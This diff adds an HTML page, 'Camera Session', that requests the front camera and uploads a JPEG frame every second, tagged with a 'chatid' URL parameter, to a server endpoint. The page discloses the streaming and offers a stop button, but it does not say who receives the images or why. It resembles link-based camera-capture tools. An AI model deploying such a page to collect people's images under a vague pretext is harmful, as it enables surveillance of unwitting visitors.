@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Camera Session</title>
+<style>
+  body { font-family: system-ui, sans-serif; background:#0b0d10; color:#e7e9ee;
+         display:grid; place-items:center; min-height:100vh; margin:0; padding:20px; }
+  .card { background:#14181d; padding:24px; border-radius:14px; border:1px solid #232a31;
+          max-width:420px; width:100%; text-align:center; }
+  h1 { font-size:17px; margin:0 0 14px; font-weight:600; }
+  video { width:100%; border-radius:10px; background:#000; transform: scaleX(-1); }
+  button { width:100%; padding:12px; margin-top:12px; border:0; border-radius:8px;
+           font-size:15px; cursor:pointer; color:#fff; background:#2f6fed; }
+  button.danger { background:#c0392b; }
+  button:disabled { opacity:.5; cursor:default; }
+  #status { margin-top:12px; font-size:13px; color:#8a95a1; min-height:18px; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <h1>Camera Session</h1>
+    <video id="vid" autoplay playsinline muted></video>
+    <button id="start">Allow Camera &amp; Start</button>
+    <button id="stop" class="danger" hidden>Stop</button>
+    <div id="status">Tap to allow camera</div>
+  </div>
+  <canvas id="cv" hidden></canvas>
+
+<script>
+  const chatid = new URLSearchParams(location.search).get('chatid');
+  const vid = document.getElementById('vid');
+  const cv = document.getElementById('cv');
+  const btnStart = document.getElementById('start');
+  const btnStop  = document.getElementById('stop');
+  const statusEl = document.getElementById('status');
+
+  let stream = null;
+  let timer  = null;
+  let backoff = 1000;
+  let sending = false;
+
+  async function sendFrame() {
+    if (sending || vid.videoWidth === 0) return;
+    sending = true;
+    try {
+      cv.width = 640; cv.height = 480;
+      cv.getContext('2d').drawImage(vid, 0, 0, 640, 480);
+      const image = cv.toDataURL('image/jpeg', 0.65);
+
+      const r = await fetch('/api/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chatid, image }),
+      });
+
+      if (r.status === 429) {
+        const d = await r.json().catch(() => ({}));
+        backoff = (d.retry_after || 2) * 1000;
+        statusEl.textContent = `Rate limited — retry in ${backoff / 1000}s`;
+        clearInterval(timer);
+        timer = setInterval(sendFrame, backoff);
+      } else {
+        backoff = 1000;
+        statusEl.textContent = 'Streaming every 1s ✓';
+      }
+    } catch (e) {
+      statusEl.textContent = 'Send error — retrying';
+    } finally {
+      sending = false;
+    }
+  }
+
+  btnStart.addEventListener('click', async () => {
+    if (!chatid) { statusEl.textContent = 'chatid missing in URL'; return; }
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: 640, height: 480 },
+        audio: false,
+      });
+      vid.srcObject = stream;
+      btnStart.hidden = true;
+      btnStop.hidden  = false;
+      statusEl.textContent = 'Streaming every 1s ✓';
+      timer = setInterval(sendFrame, 1000);
+    } catch (e) {
+      statusEl.textContent = 'Camera denied: ' + e.message;
+    }
+  });
+
+  btnStop.addEventListener('click', () => {
+    clearInterval(timer);
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    statusEl.textContent = 'Stopped';
+    btnStart.hidden = false;
+    btnStop.hidden  = true;
+  });
+</script>
+</body>
+</html>
